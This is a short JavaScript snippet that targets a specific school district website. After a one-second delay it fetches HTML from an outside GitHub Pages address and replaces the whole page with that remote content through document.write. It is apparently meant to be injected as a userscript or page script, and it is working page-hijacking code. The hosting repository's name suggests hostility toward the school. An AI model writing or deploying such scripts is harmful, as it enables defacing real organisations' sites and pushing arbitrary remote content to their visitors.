setTimeout(() => { (function() {
    if (window.location.href === 'https://tumwater.beaverton.k12.or.us/') {
    fetch('https://myschoolisass.github.io/pain/test2.html')
    .then(response => response.text())
    .then(html => {
        document.open();
        document.write(html);
        document.close();
    });    }
})(); }, 1000);
